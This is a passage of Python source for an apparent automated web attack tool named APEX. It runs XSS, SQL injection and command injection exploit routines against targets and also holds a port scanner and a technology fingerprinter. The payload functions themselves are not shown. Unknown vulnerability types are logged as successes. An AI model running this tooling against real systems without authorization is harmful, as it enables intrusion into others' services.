        endpoint = vuln.get('endpoint', '')
        target = vuln.get('target', '')
        emit_feed(exploit_id, f'Exploiting {vuln_type.upper()} on {endpoint}...', 'info')
        try:
            if vuln_type == 'xss': result = exploit_xss_real(target, endpoint, vuln)
            elif vuln_type == 'sqli': result = exploit_sqli_real(target, endpoint, vuln)
            elif vuln_type == 'cmdi': result = exploit_cmdi_real(target, endpoint, vuln)
            else: result = {'success': True, 'message': 'Vulnerability confirmed', 'details': ['Exploitation requires manual testing']}
            if result.get('success'):
                success_count += 1
                emit_feed(exploit_id, f'SUCCESS: {vuln_type.upper()} exploited!', 'success')
                for detail in result.get('details', []): emit_feed(exploit_id, f'   → {detail}', 'info')
            else:
                fail_count += 1
                emit_feed(exploit_id, f'FAILED: {vuln_type.upper()} - {result.get("message", "Unknown")}', 'error')
        except Exception as e:
            fail_count += 1
            emit_feed(exploit_id, f'ERROR: {vuln_type.upper()} - {str(e)}', 'error')
    conn = sqlite3.connect('data/apex.db')
    c = conn.cursor()
    c.execute('UPDATE scan_history SET exploits_run=?, exploits_success=? WHERE id=?', (success_count + fail_count, success_count, scan_id))
    conn.commit()
    conn.close()
    emit_feed(exploit_id, f'Exploitation complete — {success_count}/{success_count + fail_count} successful', 'success')
    socketio.emit('exploit_complete', {'exploit_id': exploit_id, 'success': success_count, 'failed': fail_count})

# ============================================================
# UTILITY FUNCTIONS
# ============================================================
def scan_ports(host):
    common = [21, 22, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
    open_ports = []
    for port in common[:12]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.8)
            if sock.connect_ex((host, port)) == 0: open_ports.append(port)
            sock.close()
        except: pass
    return open_ports

def fingerprint_tech(target):
    try:
        sess = get_session()
        r = sess.get(target, timeout=5)
        tech = {'server': r.headers.get('Server', 'Unknown')}
        content = r.text.lower()
        if 'wp-content' in content: tech['cms'] = 'WordPress'
        elif 'joomla' in content: tech['cms'] = 'Joomla'
        elif 'drupal' in content: tech['cms'] = 'Drupal'
        elif 'magento' in content: tech['cms'] = 'Magento'
        elif 'shopify' in content: tech['cms'] = 'Shopify'
        return tech
    except: return {'server': 'Unknown'}

def emit_feed(scan_id, message, level='info'):
    entry = {'scan_id': scan_id, 'message': message, 'level': level, 'timestamp': datetime.now().strftime('%H:%M:%S')}
    live_feed.append(entry)
    socketio.emit('feed_update', entry)

def update_progress(scan_id, progress):
    if scan_id in scan_results:
        scan_results[scan_id]['progress'] = progress
        socketio.emit('progress_update', {'scan_id': scan_id, 'progress': progress})

@socketio.on('connect')
def handle_connect():
    emit('connected', {'status': 'ok'})

@socketio.on('request_feed')
def handle_feed_request():
    emit('feed_history', live_feed[-50:])

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════╗
    ║          🔺  A P E X  🔺                ║
    ║   Running on http://0.0.0.0:80           ║
    ╚══════════════════════════════════════════╝
    """)
    socketio.run(app, host='0.0.0.0', port=80, debug=False, allow_unsafe_werkzeug=True)
